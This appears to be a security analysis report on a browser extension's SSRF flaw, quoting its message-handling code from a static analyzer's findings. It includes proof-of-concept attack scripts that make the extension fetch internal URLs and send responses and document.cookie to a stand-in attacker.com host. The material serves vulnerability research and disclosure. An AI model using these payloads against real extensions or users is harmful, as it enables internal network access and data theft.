# CoCo Analysis: hlagecmhpppmpfdifmigdglnhcpnohib

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (XMLHttpRequest_url_sink, XMLHttpRequest_post_sink, chrome_storage_local_set_sink - all exploitable via same vulnerability)

---

## Sink 1: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hlagecmhpppmpfdifmigdglnhcpnohib/opgen_generated_files/bg.js
Line 1393	xhttp.open(method, request.url, true);

## Sink 2: bg_chrome_runtime_MessageExternal → XMLHttpRequest_post_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hlagecmhpppmpfdifmigdglnhcpnohib/opgen_generated_files/bg.js
Line 1399	xhttp.send(request.data);

## Sink 3: cs_window_eventListener_message → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hlagecmhpppmpfdifmigdglnhcpnohib/opgen_generated_files/cs_0.js
Line 889	window.addEventListener("message", function(ev) {
Line 890	if (ev.data.eventId && ev.data.extId && ev.data.extId == extensionId) {

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hlagecmhpppmpfdifmigdglnhcpnohib/opgen_generated_files/bg.js
Line 1393	xhttp.open(method, request.url, true);

**Code:**

```javascript
// Attack Vector 1: Direct external message (from malicious extension)
// Background script (bg.js, line 1291, 1379-1401)
const onMessage = chrome.runtime.onMessageExternal || chrome.runtime.onMessage;

const extensionCommunicationCallback = function(request, sender, callback) {
  if (request.action == "xhttp") {
    const xhttp = new XMLHttpRequest();
    const method = request.method ? request.method.toUpperCase() : 'GET';

    xhttp.onreadystatechange = function () {
      if (xhttp.readyState == 4) {
        if (xhttp.status == 200)
          callback({status: xhttp.status, response: xhttp.response});
        else
          callback({status: xhttp.status, response: xhttp.response});
      }
    };

    xhttp.open(method, request.url, true);  // ← attacker-controlled URL, no validation!

    if (method == 'POST') {
      xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    }

    xhttp.send(request.data);  // ← attacker-controlled data

    return true;
  }
  // ... other actions ...
}
onMessage.addListener(extensionCommunicationCallback);

// Attack Vector 2: Via webpage postMessage (on bitbucket.org)
// Content script (cs_0.js, line 792, 796, 889-895)
const extensionId = chrome.runtime.id || 'stashFF';
// Extension ID injected into page, making it publicly accessible:
createInlineScript(`var chromeExtId='${extensionId}';`);

// Content script accepts messages from webpage and relays to background
window.addEventListener("message", function(ev) {
  if (ev.data.eventId && ev.data.extId && ev.data.extId == extensionId) {  // ← Known ID!
    chrome.runtime.sendMessage(ev.data, function(res) {  // ← Forwards to background
      const data = { backgroundResult: res, identifier: ev.data.eventId };
      window.postMessage(data, "*");
    });
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector 1:** chrome.runtime.onMessageExternal - malicious extension can send messages

**Attack Vector 2:** window.postMessage on bitbucket.org/atlassian.com - webpage sends message with known extension ID

**Attack (Vector 1 - Malicious Extension):**

```javascript
// From another malicious extension installed by the user
chrome.runtime.sendMessage('hlagecmhpppmpfdifmigdglnhcpnohib', {
  action: 'xhttp',
  method: 'GET',
  url: 'https://internal-company-server/admin/secrets'
}, function(response) {
  // Exfiltrate response
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(response)
  });
});

// Or POST data to attacker server
chrome.runtime.sendMessage('hlagecmhpppmpfdifmigdglnhcpnohib', {
  action: 'xhttp',
  method: 'POST',
  url: 'https://attacker.com/collect',
  data: 'stolen=data'
}, function(response) {
  console.log('Attack successful');
});
```

**Attack (Vector 2 - Malicious Webpage on Bitbucket):**

```javascript
// From malicious script on bitbucket.org (via XSS, compromised plugin, etc.)
// The extension exposes its ID via: var chromeExtId='...'
const extId = window.chromeExtId || 'hlagecmhpppmpfdifmigdglnhcpnohib';

// Send SSRF request
window.postMessage({
  eventId: 'attack123',
  extId: extId,
  action: 'xhttp',
  method: 'GET',
  url: 'http://localhost:8080/admin/api'  // Internal server
}, "*");

// Listen for response
window.addEventListener('message', function(ev) {
  if (ev.data.identifier === 'attack123') {
    console.log('Stolen data:', ev.data.backgroundResult);
    fetch('https://attacker.com/exfiltrate', {
      method: 'POST',
      body: JSON.stringify(ev.data.backgroundResult)
    });
  }
});

// Or POST sensitive data
window.postMessage({
  eventId: 'attack456',
  extId: extId,
  action: 'xhttp',
  method: 'POST',
  url: 'https://attacker.com/collect',
  data: 'cookie=' + document.cookie
}, "*");
```

**Impact:** Server-Side Request Forgery (SSRF) allowing arbitrary cross-origin requests with extension privileges. An attacker can:
1. Make GET/POST requests to any URL including internal networks (localhost, 192.168.x.x, 10.x.x.x)
2. Bypass CORS restrictions since requests originate from the extension
3. Access internal company servers, admin panels, and APIs
4. Exfiltrate responses back to attacker
5. Send malicious POST data to any endpoint

The extension has broad host permissions ("http://*/*", "https://*/*") making this a critical SSRF vulnerability. Attack Vector 1 requires a malicious extension, while Attack Vector 2 can be exploited via XSS or compromised scripts on bitbucket.org/atlassian.com domains.
